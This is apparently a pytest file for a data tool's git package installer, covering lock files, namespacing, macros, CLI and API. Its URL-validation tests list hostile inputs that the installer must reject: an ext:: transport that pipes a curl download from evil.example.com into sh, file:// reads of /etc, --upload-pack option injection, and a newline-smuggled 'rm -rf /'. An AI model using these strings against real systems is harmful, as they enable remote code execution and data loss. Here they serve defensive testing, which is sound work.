"""Tests for havn packages: install, lock, namespacing, macros, CLI and API.

Package sources are local bare repositories created in ``tmp_path``. That
exercises ``git clone`` and ``git checkout <rev>`` for real, including the
shallow-clone path and the full-clone fallback, without any of these tests
touching the network.
"""

from __future__ import annotations

import os
import subprocess

import duckdb
import pytest
import yaml
from fastapi.testclient import TestClient
from typer.testing import CliRunner

from havn.config import load_project
from havn.engine.packages import (
    PackageError,
    install_packages,
    package_roots,
    read_lock,
    remove_package,
)
from havn.engine.transform import (
    build_dag,
    discover_all_models,
    discover_models,
    run_transform,
)
from havn.engine.transform.discovery import DuplicateModelError

@pytest.fixture(autouse=True)
def _allow_local_git_remotes(monkeypatch):
    """Let these tests clone from bare repositories in ``tmp_path``.

    ``_validate_git_url`` refuses a local path under ``git:`` in production,
    because handing git an arbitrary local string is how ``ext::`` and
    ``file://`` become code execution and disk reads. These tests need a real
    remote without a network, so they open the seam explicitly. The tests that
    assert the default behaviour close it again.
    """
    import havn.engine.packages as packages

    monkeypatch.setattr(packages, "_ALLOW_LOCAL_GIT_REMOTES", True)


_GIT_ENV = {
    **os.environ,
    "GIT_AUTHOR_NAME": "havn test",
    "GIT_AUTHOR_EMAIL": "test@havn.invalid",
    "GIT_COMMITTER_NAME": "havn test",
    "GIT_COMMITTER_EMAIL": "test@havn.invalid",
    "GIT_CONFIG_GLOBAL": "/dev/null",
    "GIT_CONFIG_SYSTEM": "/dev/null",
}


def _git(*args, cwd=None):
    result = subprocess.run(
        ["git", *args],
        cwd=str(cwd) if cwd else None,
        env=_GIT_ENV,
        capture_output=True,
        text=True,
    )
    assert result.returncode == 0, f"git {' '.join(args)} failed: {result.stderr}"
    return result


def _write(path, text):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)


def _make_package_repo(tmp_path, name="crm", *, files=None, tag="v1.0.0"):
    """Create a bare repo holding a havn package, and return its path.

    The default package has two models, ``bronze.contacts`` and
    ``silver.customers``, where the second selects from the first using the
    package's own un-prefixed name.
    """
    bare = tmp_path / f"{name}.git"
    _git("init", "--quiet", "--bare", "-b", "main", str(bare))
    work = tmp_path / f"{name}-work"
    _git("clone", "--quiet", str(bare), str(work))

    if files is None:
        files = {
            "havn_package.yml": f"name: {name}\nversion: 1.0.0\nrequires_havn: '>=0.1'\n",
            "transform/bronze/contacts.sql": (
                "@config materialized=table, schema=bronze\n\n"
                "SELECT 1 AS id, 'a@b.com' AS email\n"
            ),
            "transform/silver/customers.sql": (
                "@config materialized=table, schema=silver\n\n"
                "SELECT id, email FROM bronze.contacts\n"
            ),
        }
    for rel, text in files.items():
        _write(work / rel, text)

    _git("add", "-A", cwd=work)
    _git("commit", "--quiet", "-m", "initial", cwd=work)
    if tag:
        _git("tag", tag, cwd=work)
    _git("push", "--quiet", "origin", "main", "--tags", cwd=work)
    return bare, work


def _add_commit(work, rel, text, *, tag=None):
    """Add a commit (and optionally a tag) to a package's working clone."""
    _write(work / rel, text)
    _git("add", "-A", cwd=work)
    _git("commit", "--quiet", "-m", f"update {rel}", cwd=work)
    if tag:
        _git("tag", tag, cwd=work)
    _git("push", "--quiet", "origin", "main", "--tags", cwd=work)


def _make_project(tmp_path, packages_yaml="", *, models=None):
    project = tmp_path / "proj"
    (project / "transform" / "gold").mkdir(parents=True)
    (project / "project.yml").write_text(
        "name: testproj\ndatabase:\n  path: warehouse.duckdb\n" + packages_yaml
    )
    for rel, text in (models or {}).items():
        _write(project / rel, text)
    return project


# ---------------------------------------------------------------------------
# Config validation
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "block, fragment",
    [
        ("packages:\n  - name: crm\n", "needs a 'git' URL or a local 'path'"),
        ("packages:\n  - name: crm\n    git: https://x/y.git\n", "need a 'rev'"),
        ("packages:\n  - name: 1bad\n    path: ./p\n", "Invalid package name"),
        (
            "packages:\n  - name: crm\n    git: https://x/y.git\n    rev: v1\n    path: ./p\n",
            "not both",
        ),
        (
            "packages:\n  - name: crm\n    path: ./a\n  - name: crm\n    path: ./b\n",
            "Duplicate package name",
        ),
        ("packages: notalist\n", "must be a list"),
    ],
)
def test_invalid_packages_config_errors(tmp_path, block, fragment):
    project = _make_project(tmp_path, block)
    with pytest.raises(ValueError, match=fragment):
        load_project(project)


def test_valid_packages_config_parses(tmp_path):
    project = _make_project(
        tmp_path, "packages:\n  - name: crm\n    git: https://x/y.git\n    rev: v1.0.0\n"
    )
    config = load_project(project)
    assert [p.name for p in config.packages] == ["crm"]
    assert config.packages[0].rev == "v1.0.0"


# ---------------------------------------------------------------------------
# Git URL transports
# ---------------------------------------------------------------------------


@pytest.fixture
def strict_git_urls(monkeypatch):
    """Close the local-remote seam, so the production rules apply."""
    import havn.engine.packages as packages

    monkeypatch.setattr(packages, "_ALLOW_LOCAL_GIT_REMOTES", False)


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/example/havn-crm.git",
        "https://user@gitlab.example.com/team/pkg",
        "ssh://git@github.com/example/havn-crm.git",
        "git@github.com:example/havn-crm.git",
        "deploy@internal.example.com:packages/crm.git",
    ],
)
def test_allowed_git_transports(strict_git_urls, url):
    from havn.engine.packages import _validate_git_url

    assert _validate_git_url(url) is True, url


@pytest.mark.parametrize(
    "label, url",
    [
        # git runs the command after ext:: as the transport. Remote code
        # execution on whoever installs the package.
        ("ext transport", "ext::sh -c 'curl evil.example.com/x | sh'"),
        ("ext transport, spaced", "ext::git-upload-pack /etc"),
        ("transport prefix", "transport::address"),
        # Reads of the server's own disk.
        ("file scheme", "file:///etc"),
        ("file scheme, repo", "file:///home/user/secret.git"),
        ("absolute path", "/etc"),
        ("relative path", "../../etc"),
        ("home path", "~/secrets.git"),
        # Cleartext transports: whatever the network returns gets imported.
        ("git protocol", "git://github.com/example/havn-crm.git"),
        ("http", "http://github.com/example/havn-crm.git"),
        # Still rejected for the old reasons.
        ("leading dash", "--upload-pack=sh"),
        ("newline", "https://x/y.git\nrm -rf /"),
        ("empty", ""),
    ],
)
def test_rejected_git_transports(strict_git_urls, label, url):
    from havn.engine.packages import _validate_git_url

    assert _validate_git_url(url) is False, label


def test_a_local_directory_is_rejected_as_a_git_source(strict_git_urls, tmp_path):
    """A real directory is still not a git source; that is what path: is for."""
    from havn.engine.packages import _validate_git_url

    (tmp_path / "pkg").mkdir()
    assert _validate_git_url(str(tmp_path / "pkg")) is False


def test_install_refuses_an_ext_transport(strict_git_urls, tmp_path):
    project = _make_project(
        tmp_path,
        "packages:\n  - name: crm\n    git: 'ext::sh -c id'\n    rev: v1.0.0\n",
    )
    results = install_packages(project, load_project(project))
    assert [r.status for r in results] == ["error"]
    assert "invalid git URL" in results[0].message
    assert not (project / "havn_packages" / "crm").exists()


def test_install_refuses_a_file_url(strict_git_urls, tmp_path):
    bare, _ = _make_package_repo(tmp_path)
    project = _make_project(
        tmp_path, f"packages:\n  - name: crm\n    git: file://{bare}\n    rev: v1.0.0\n"
    )
    results = install_packages(project, load_project(project))
    assert [r.status for r in results] == ["error"]
    assert "invalid git URL" in results[0].message
    assert not (project / "havn_packages" / "crm").exists()


def test_install_error_points_at_path_for_a_local_source(strict_git_urls, tmp_path):
    bare, _ = _make_package_repo(tmp_path)
    project = _make_project(
        tmp_path, f"packages:\n  - name: crm\n    git: {bare}\n    rev: v1.0.0\n"
    )
    results = install_packages(project, load_project(project))
    assert [r.status for r in results] == ["error"]
    assert "use 'path:' instead of 'git:'" in results[0].message


def test_a_local_path_source_still_installs(strict_git_urls, tmp_path):
    """path: is the supported way to use a package on this machine."""
    _, work = _make_package_repo(tmp_path)
    project = _make_project(
        tmp_path, f"packages:\n  - name: crm\n    path: {work}\n"
    )
    results = install_packages(project, load_project(project))
    assert [r.status for r in results] == ["installed"]
    assert (project / "havn_packages" / "crm" / "havn_package.yml").is_file()


# ---------------------------------------------------------------------------
# Install and lock
# ---------------------------------------------------------------------------


def test_install_at_tag_writes_lock(tmp_path):
    bare, _ = _make_package_repo(tmp_path)
    project = _make_project(
        tmp_path, f"packages:\n  - name: crm\n    git: {bare}\n    rev: v1.0.0\n"
    )
    results = install_packages(project, load_project(project))

    assert [r.status for r in results] == ["installed"]
    assert results[0].warnings == []
    assert (project / "havn_packages" / "crm" / "transform").is_dir()

    lock = read_lock(project)
    assert set(lock) == {"crm"}
    assert lock["crm"].source == "git"
    assert lock["crm"].rev == "v1.0.0"
    assert len(lock["crm"].commit) == 40

    raw = yaml.safe_load((project / "havn_packages.lock").read_text())
    assert raw["version"] == 1
    assert raw["packages"][0]["name"] == "crm"


def test_second_install_honors_the_lock(tmp_path):
    bare, work = _make_package_repo(tmp_path)
    project = _make_project(
        tmp_path, f"packages:\n  - name: crm\n    git: {bare}\n    rev: v1.0.0\n"
    )
    first = install_packages(project, load_project(project))
    locked_commit = read_lock(project)["crm"].commit

    # Move the tag onto a newer commit. Without the lock the second install
    # would follow it; with the lock it must not.
    _add_commit(work, "transform/bronze/contacts.sql", "@config schema=bronze\n\nSELECT 2 AS id\n")
    _git("tag", "-f", "v1.0.0", cwd=work)
    _git("push", "--quiet", "--force", "origin", "--tags", cwd=work)

    second = install_packages(project, load_project(project))
    assert second[0].status == "unchanged"
    assert read_lock(project)["crm"].commit == locked_commit == first[0].commit


def test_upgrade_moves_to_a_new_tag(tmp_path):
    bare, work = _make_package_repo(tmp_path)
    project = _make_project(
        tmp_path, f"packages:\n  - name: crm\n    git: {bare}\n    rev: v1.0.0\n"
    )
    install_packages(project, load_project(project))
    first_commit = read_lock(project)["crm"].commit

    _add_commit(
        work,
        "transform/bronze/contacts.sql",
        "@config materialized=table, schema=bronze\n\nSELECT 2 AS id, 'c@d.com' AS email\n",
        tag="v2.0.0",
    )
    (project / "project.yml").write_text(
        f"name: testproj\ndatabase:\n  path: warehouse.duckdb\n"
        f"packages:\n  - name: crm\n    git: {bare}\n    rev: v2.0.0\n"
    )

    results = install_packages(project, load_project(project), upgrade=True)
    assert results[0].status == "installed"
    second_commit = read_lock(project)["crm"].commit
    assert second_commit != first_commit
    assert read_lock(project)["crm"].rev == "v2.0.0"
    assert "SELECT 2 AS id" in (
        project / "havn_packages" / "crm" / "transform" / "bronze" / "contacts.sql"
    ).read_text()


def test_branch_rev_warns_that_it_is_not_a_pin(tmp_path):
    bare, _ = _make_package_repo(tmp_path)
    project = _make_project(
        tmp_path, f"packages:\n  - name: crm\n    git: {bare}\n    rev: main\n"
    )
    results = install_packages(project, load_project(project))
    assert results[0].status == "installed"
    assert any("branch" in w for w in results[0].warnings)


def test_commit_rev_uses_the_full_clone_fallback(tmp_path):
    bare, work = _make_package_repo(tmp_path)
    sha = _git("rev-parse", "HEAD", cwd=work).stdout.strip()
    project = _make_project(
        tmp_path, f"packages:\n  - name: crm\n    git: {bare}\n    rev: {sha}\n"
    )
    results = install_packages(project, load_project(project))
    assert results[0].status == "installed"
    assert results[0].commit == sha
    assert results[0].warnings == []


def test_unknown_rev_is_reported_not_raised(tmp_path):
    bare, _ = _make_package_repo(tmp_path)
    project = _make_project(
        tmp_path, f"packages:\n  - name: crm\n    git: {bare}\n    rev: v9.9.9\n"
    )
    results = install_packages(project, load_project(project))
    assert results[0].status == "error"
    assert "v9.9.9" in results[0].message


def test_invalid_rev_is_rejected_before_git_runs(tmp_path):
    from havn.engine.packages import _install_one
    from havn.config import PackageConfig

    project = _make_project(tmp_path)
    pkg = PackageConfig(name="crm", git="https://x/y.git", rev="v1")
    pkg.rev = "--upload-pack=evil"
    with pytest.raises(PackageError, match="invalid rev"):
        _install_one(project, pkg, None, upgrade=False)


def test_local_path_package_is_copied(tmp_path):
    source = tmp_path / "shared"
    _write(
        source / "transform" / "silver" / "dim_date.sql",
        "@config materialized=table, schema=silver\n\nSELECT 1 AS day_key\n",
    )
    (source / ".git").mkdir()
    (source / ".git" / "HEAD").write_text("ref: refs/heads/main\n")

    project = _make_project(tmp_path, f"packages:\n  - name: shared\n    path: {source}\n")
    results = install_packages(project, load_project(project))

    assert results[0].status == "installed"
    assert results[0].source == "path"
    installed = project / "havn_packages" / "shared"
    assert (installed / "transform" / "silver" / "dim_date.sql").is_file()
    # The package's own .git must not travel into the host project.
    assert not (installed / ".git").exists()
    assert read_lock(project)["shared"].source == "path"


def test_remove_package_deletes_checkout_and_lock_entry(tmp_path):
    bare, _ = _make_package_repo(tmp_path)
    project = _make_project(
        tmp_path, f"packages:\n  - name: crm\n    git: {bare}\n    rev: v1.0.0\n"
    )
    install_packages(project, load_project(project))

    assert remove_package(project, "crm") is True
    assert not (project / "havn_packages" / "crm").exists()
    assert read_lock(project) == {}
    assert remove_package(project, "crm") is False


# ---------------------------------------------------------------------------
# Namespacing
# ---------------------------------------------------------------------------


def _installed_project(tmp_path, **kwargs):
    bare, work = _make_package_repo(tmp_path, **kwargs)
    project = _make_project(
        tmp_path, f"packages:\n  - name: crm\n    git: {bare}\n    rev: v1.0.0\n"
    )
    results = install_packages(project, load_project(project))
    assert all(r.ok for r in results), [r.message for r in results]
    return project, bare, work


def test_package_schemas_are_prefixed(tmp_path):
    project, _, _ = _installed_project(tmp_path)
    models = {m.full_name: m for m in discover_all_models(project)}
    assert set(models) == {"crm_bronze.contacts", "crm_silver.customers"}
    assert models["crm_silver.customers"].package == "crm"
    assert models["crm_silver.customers"].schema == "crm_silver"


def test_intra_package_references_are_rewritten(tmp_path):
    project, _, _ = _installed_project(tmp_path)
    models = {m.full_name: m for m in discover_all_models(project)}
    customers = models["crm_silver.customers"]
    assert customers.depends_on == ["crm_bronze.contacts"]
    assert "crm_bronze.contacts" in customers.query
    assert "bronze.contacts" in customers.query  # substring of the prefixed name
    assert " FROM bronze.contacts" not in customers.query


def test_references_outside_the_package_are_left_alone(tmp_path):
    files = {
        "transform/silver/enriched.sql": (
            "@config materialized=table, schema=silver\n\n"
            "SELECT * FROM landing.raw_events\n"
        ),
    }
    project, _, _ = _installed_project(tmp_path, files=files)
    model = discover_all_models(project)[0]
    assert model.depends_on == ["landing.raw_events"]
    assert "landing.raw_events" in model.query


def test_manifest_schema_override_keeps_the_original_name(tmp_path):
    files = {
        "havn_package.yml": "name: crm\nversion: 0.1.0\nschemas:\n  silver: silver\n",
        "transform/silver/customers.sql": (
            "@config materialized=table, schema=silver\n\nSELECT 1 AS id\n"
        ),
    }
    project, _, _ = _installed_project(tmp_path, files=files)
    names = {m.full_name for m in discover_all_models(project)}
    assert names == {"silver.customers"}


def test_collision_after_a_schema_override_raises(tmp_path):
    files = {
        "havn_package.yml": "name: crm\nversion: 0.1.0\nschemas:\n  silver: silver\n",
        "transform/silver/customers.sql": (
            "@config materialized=table, schema=silver\n\nSELECT 1 AS id\n"
        ),
    }
    project, _, _ = _installed_project(tmp_path, files=files)
    _write(
        project / "transform" / "silver" / "customers.sql",
        "@config materialized=table, schema=silver\n\nSELECT 2 AS id\n",
    )
    with pytest.raises(DuplicateModelError, match="silver.customers"):
        discover_all_models(project)


def test_project_model_can_build_on_a_package_model(tmp_path):
    project, _, _ = _installed_project(tmp_path)
    _write(
        project / "transform" / "gold" / "report.sql",
        "@config materialized=table, schema=gold\n\n"
        "SELECT COUNT(*) AS n FROM crm_silver.customers\n",
    )
    conn = duckdb.connect(str(project / "warehouse.duckdb"))
    try:
        statuses = run_transform(conn, project / "transform", project_dir=project)
        assert statuses == {
            "crm_bronze.contacts": "built",
            "crm_silver.customers": "built",
            "gold.report": "built",
        }
        assert conn.execute("SELECT n FROM gold.report").fetchone() == (1,)
        assert conn.execute("SELECT id FROM crm_bronze.contacts").fetchone() == (1,)
    finally:
        conn.close()


def test_package_roots_needs_the_lock(tmp_path):
    project, _, _ = _installed_project(tmp_path)
    assert [r.name for r in package_roots(project)] == ["crm"]
    (project / "havn_packages.lock").unlink()
    assert package_roots(project) == []
    assert discover_all_models(project) == []


def test_project_without_packages_is_unaffected(tmp_path):
    project = _make_project(tmp_path)
    _write(
        project / "transform" / "gold" / "report.sql",
        "@config materialized=table, schema=gold\n\nSELECT 1 AS n\n",
    )
    config = load_project(project)
    assert config.packages == []
    assert not (project / "havn_packages.lock").exists()

    plain = discover_models(project / "transform")
    everything = discover_all_models(project, config)
    assert [m.full_name for m in everything] == [m.full_name for m in plain]
    assert [m.content_hash for m in everything] == [m.content_hash for m in plain]
    assert all(m.package is None for m in everything)


# ---------------------------------------------------------------------------
# Macros
# ---------------------------------------------------------------------------


def test_package_macros_register_with_project_precedence(tmp_path):
    from havn.engine.macros import list_macros, register_macros, reset_macro_state

    files = {
        "havn_package.yml": "name: crm\nversion: 0.1.0\n",
        "macros/crm_utils.py": (
            "from havn import macro\n\n"
            "@macro\ndef crm_only(x: str) -> str:\n    return 'pkg:' + x\n\n"
            "@macro\ndef contested(x: str) -> str:\n    return 'package'\n"
        ),
        "macros/extra.sql": "CREATE MACRO crm_double(a) AS a * 2;\n",
    }
    project, _, _ = _installed_project(tmp_path, files=files)
    _write(
        project / "macros" / "crm_utils.py",
        "from havn import macro\n\n"
        "@macro\ndef contested(x: str) -> str:\n    return 'project'\n",
    )

    reset_macro_state()
    conn = duckdb.connect()
    try:
        register_macros(conn, project)
        row = conn.execute(
            "SELECT crm_only('a'), contested('b'), crm_double(21)"
        ).fetchone()
        # Package macro available, project macro wins the contested name.
        assert row == ("pkg:a", "project", 42)
    finally:
        conn.close()
        reset_macro_state()

    listed = {m["name"]: m for m in list_macros(project)}
    assert listed["crm_only"]["package"] == "crm"
    assert listed["crm_double"]["package"] == "crm"
    assert listed["contested"].get("package", "") == ""


def test_package_macro_modules_do_not_collide_in_sys_modules(tmp_path):
    """Both files are called utils.py; both must actually be imported."""
    from havn.engine.macros import register_macros, reset_macro_state

    files = {
        "havn_package.yml": "name: crm\nversion: 0.1.0\n",
        "macros/utils.py": (
            "from havn import macro\n\n"
            "@macro\ndef from_package(x: str) -> str:\n    return 'pkg'\n"
        ),
    }
    project, _, _ = _installed_project(tmp_path, files=files)
    _write(
        project / "macros" / "utils.py",
        "from havn import macro\n\n"
        "@macro\ndef from_project(x: str) -> str:\n    return 'proj'\n",
    )

    reset_macro_state()
    conn = duckdb.connect()
    try:
        register_macros(conn, project)
        assert conn.execute("SELECT from_package('x'), from_project('x')").fetchone() == (
            "pkg",
            "proj",
        )
    finally:
        conn.close()
        reset_macro_state()


# ---------------------------------------------------------------------------
# Selectors and CLI
# ---------------------------------------------------------------------------


def test_package_selector(tmp_path):
    from havn.engine.selectors import select_models

    project, _, _ = _installed_project(tmp_path)
    _write(
        project / "transform" / "gold" / "report.sql",
        "@config materialized=table, schema=gold\n\nSELECT 1 AS n\n",
    )
    dag = build_dag(discover_all_models(project))

    assert select_models(["package:crm"], dag, project_dir=project).selected == [
        "crm_bronze.contacts",
        "crm_silver.customers",
    ]
    assert select_models(["package:"], dag, project_dir=project).selected == ["gold.report"]
    assert select_models(["package:*"], dag, project_dir=project).selected == [
        "crm_bronze.contacts",
        "crm_silver.customers",
    ]
    # path: reaches package files too, since they live under the project root.
    assert select_models(
        ["path:havn_packages/crm"], dag, project_dir=project
    ).selected == ["crm_bronze.contacts", "crm_silver.customers"]


def test_cli_ls_package_selector(tmp_path):
    from havn.cli import app

    project, _, _ = _installed_project(tmp_path)
    result = CliRunner().invoke(app, ["ls", "package:crm", "-p", str(project)])
    assert result.exit_code == 0, result.output
    assert "crm_silver.customers" in result.output
    assert "crm_bronze.contacts" in result.output


def test_cli_packages_install_list_and_remove(tmp_path):
    from havn.cli import app

    bare, _ = _make_package_repo(tmp_path)
    project = _make_project(
        tmp_path, f"packages:\n  - name: crm\n    git: {bare}\n    rev: v1.0.0\n"
    )
    runner = CliRunner()

    installed = runner.invoke(app, ["packages", "install", "-p", str(project)])
    assert installed.exit_code == 0, installed.output
    assert (project / "havn_packages.lock").is_file()

    listed = runner.invoke(app, ["packages", "-p", str(project)])
    assert listed.exit_code == 0, listed.output
    assert "crm" in listed.output
    assert "v1.0.0" in listed.output

    removed = runner.invoke(app, ["packages", "remove", "crm", "-p", str(project)])
    assert removed.exit_code == 0, removed.output
    assert not (project / "havn_packages" / "crm").exists()


def test_cli_packages_install_without_a_block(tmp_path):
    from havn.cli import app

    project = _make_project(tmp_path)
    result = CliRunner().invoke(app, ["packages", "install", "-p", str(project)])
    assert result.exit_code == 0
    assert "nothing to install" in result.output
    assert not (project / "havn_packages.lock").exists()


# ---------------------------------------------------------------------------
# API
# ---------------------------------------------------------------------------


@pytest.fixture
def packages_client(tmp_path):
    import havn.server.app as server_app
    from havn.server.deps import invalidate_config_cache, reset_shared_conn

    project, _, _ = _installed_project(tmp_path)
    _write(
        project / "transform" / "gold" / "report.sql",
        "@config materialized=table, schema=gold\n\n"
        "SELECT COUNT(*) AS n FROM crm_silver.customers\n",
    )
    reset_shared_conn()
    invalidate_config_cache()
    server_app.PROJECT_DIR = project
    server_app.AUTH_ENABLED = False
    yield TestClient(server_app.app), project
    reset_shared_conn()
    invalidate_config_cache()


def test_api_lists_packages(packages_client):
    client, _ = packages_client
    resp = client.get("/api/packages")
    assert resp.status_code == 200
    body = resp.json()
    assert [p["name"] for p in body["packages"]] == ["crm"]
    assert body["packages"][0]["models"] == 2
    assert body["packages"][0]["version"] == "1.0.0"
    assert len(body["packages"][0]["commit"]) == 40
    assert body["missing"] == []


def test_api_dag_marks_package_nodes(packages_client):
    client, _ = packages_client
    resp = client.get("/api/dag")
    assert resp.status_code == 200
    by_id = {n["id"]: n for n in resp.json()["nodes"]}
    assert by_id["crm_silver.customers"]["package"] == "crm"
    assert by_id["gold.report"]["package"] is None


def test_api_file_tree_marks_package_files(packages_client):
    client, _ = packages_client
    resp = client.get("/api/files")
    assert resp.status_code == 200
    top = {f["name"]: f for f in resp.json()}
    assert "havn_packages" in top
    assert top["havn_packages"]["package"] == ""
    crm = next(c for c in top["havn_packages"]["children"] if c["name"] == "crm")
    assert crm["package"] == "crm"
    assert top["transform"]["package"] is None


def test_api_install_endpoint(tmp_path):
    import havn.server.app as server_app
    from havn.server.deps import invalidate_config_cache, reset_shared_conn

    bare, _ = _make_package_repo(tmp_path)
    project = _make_project(
        tmp_path, f"packages:\n  - name: crm\n    git: {bare}\n    rev: v1.0.0\n"
    )
    reset_shared_conn()
    invalidate_config_cache()
    server_app.PROJECT_DIR = project
    server_app.AUTH_ENABLED = False
    client = TestClient(server_app.app)
    try:
        resp = client.post("/api/packages/install", json={})
        assert resp.status_code == 200, resp.text
        body = resp.json()
        assert body["results"][0]["status"] == "installed"
        assert [p["name"] for p in body["packages"]] == ["crm"]
        # The model list must reflect the install without a restart.
        models = client.get("/api/models").json()
        names = {m["full_name"] if "full_name" in m else m.get("name") for m in models}
        assert "crm_silver.customers" in names
    finally:
        reset_shared_conn()
        invalidate_config_cache()


# ---------------------------------------------------------------------------
# Whole-project callers see package models
#
# Every caller below lists or builds the DAG for the project as a whole, so a
# package model has to be in the list. The single-directory primitive stays
# right for callers that genuinely mean one directory (discovery's own tests,
# the importer, the PR diff), and those are left alone.
# ---------------------------------------------------------------------------


_SOURCE_PACKAGE_FILES = {
    "havn_package.yml": "name: crm\nversion: 0.1.0\n",
    "transform/silver/enriched.sql": (
        "@config materialized=table, schema=silver\n\n"
        "SELECT event_id, payload FROM landing.raw_events\n"
    ),
}


def test_sentinel_impact_analysis_covers_package_models(tmp_path):
    from havn.engine.sentinel import SchemaChange, analyze_impact

    project, _, _ = _installed_project(tmp_path, files=_SOURCE_PACKAGE_FILES)
    records = analyze_impact(
        project,
        "landing.raw_events",
        [
            SchemaChange(
                change_type="column_removed",
                severity="breaking",
                column_name="payload",
            )
        ],
    )
    assert "crm_silver.enriched" in {r.model_name for r in records}


def test_sentinel_source_names_cover_package_models(tmp_path):
    from havn.engine.sentinel import get_source_names_from_models

    project, _, _ = _installed_project(tmp_path, files=_SOURCE_PACKAGE_FILES)
    assert "landing.raw_events" in get_source_names_from_models(project)


def test_rewind_downstream_covers_package_models(tmp_path):
    from havn.engine.snapshots import get_downstream_models

    project, _, _ = _installed_project(tmp_path)
    downstream = get_downstream_models("crm_bronze.contacts", project / "transform")
    assert downstream == ["crm_silver.customers"]


def test_debug_notebook_covers_package_models(tmp_path):
    from havn.engine.notebook import generate_debug_notebook

    project, _, _ = _installed_project(tmp_path)
    conn = duckdb.connect()
    try:
        notebook = generate_debug_notebook(
            conn,
            "crm_silver.customers",
            project / "transform",
            error_message="boom",
        )
    finally:
        conn.close()
    sources = " ".join(str(c.get("source", "")) for c in notebook["cells"])
    assert "crm_silver.customers" in sources


def test_model_to_notebook_covers_package_models(tmp_path):
    from havn.engine.notebook import model_to_notebook

    project, _, _ = _installed_project(tmp_path)
    notebook_dir = project / "notebooks"
    notebook_dir.mkdir()
    conn = duckdb.connect()
    try:
        notebook = model_to_notebook(
            conn, "crm_silver.customers", project / "transform", notebook_dir
        )
    finally:
        conn.close()
    sources = " ".join(str(c.get("source", "")) for c in notebook["cells"])
    assert "crm_bronze.contacts" in sources


def test_check_freshness_covers_package_source_specs(tmp_path):
    from havn.engine.transform.analysis import check_freshness

    files = {
        "havn_package.yml": "name: crm\nversion: 0.1.0\n",
        "transform/silver/enriched.sql": (
            "@config materialized=table, schema=silver\n"
            "@source_freshness landing.raw_events, max_age=24h, on=ts\n\n"
            "SELECT event_id FROM landing.raw_events\n"
        ),
    }
    project, _, _ = _installed_project(tmp_path, files=files)
    conn = duckdb.connect(str(project / "warehouse.duckdb"))
    try:
        conn.execute("CREATE SCHEMA IF NOT EXISTS landing")
        conn.execute(
            "CREATE TABLE landing.raw_events AS "
            "SELECT 1 AS event_id, current_timestamp AS ts"
        )
        run_transform(conn, project / "transform", project_dir=project)
        rows = {
            r["model"]: r
            for r in check_freshness(
                conn, include_sources=True, transform_dir=project / "transform"
            )
        }
    finally:
        conn.close()
    sources = rows["crm_silver.enriched"]["sources"]
    assert [s["table"] for s in sources] == ["landing.raw_events"]


def test_unit_tests_can_target_a_package_model(tmp_path):
    from havn.engine.unit_tests import run_unit_tests

    project, _, _ = _installed_project(tmp_path)
    _write(
        project / "tests" / "unit" / "crm_customers.yml",
        "model: crm_silver.customers\n"
        "tests:\n"
        "  - name: passes the package model through\n"
        "    given:\n"
        "      crm_bronze.contacts:\n"
        "        rows:\n"
        "          - {id: 7, email: 'x@y.com'}\n"
        "    expect:\n"
        "      rows:\n"
        "        - {id: 7, email: 'x@y.com'}\n",
    )
    result = run_unit_tests(project)
    assert result.load_errors == []
    assert len(result.results) == 1, result.to_dict()
    assert result.results[0].passed, result.to_dict()


def test_promote_to_model_dag_check_covers_package_models(tmp_path):
    """Promoting onto a name a package already claims has to be reported."""
    import havn.server.app as server_app
    from havn.server.deps import invalidate_config_cache, reset_shared_conn

    files = {
        "havn_package.yml": "name: crm\nversion: 0.1.0\nschemas:\n  bronze: bronze\n",
        "transform/bronze/contacts.sql": (
            "@config materialized=table, schema=bronze\n\nSELECT 1 AS id\n"
        ),
    }
    project, _, _ = _installed_project(tmp_path, files=files)
    reset_shared_conn()
    invalidate_config_cache()
    server_app.PROJECT_DIR = project
    server_app.AUTH_ENABLED = False
    client = TestClient(server_app.app)
    try:
        resp = client.post(
            "/api/notebooks/promote-to-model",
            json={
                "sql_source": "SELECT 2 AS id",
                "model_name": "contacts",
                "target_schema": "bronze",
            },
        )
        assert resp.status_code == 200, resp.text
        warnings = resp.json()["validation_warnings"]
        assert any("bronze.contacts" in w for w in warnings), warnings
    finally:
        reset_shared_conn()
        invalidate_config_cache()
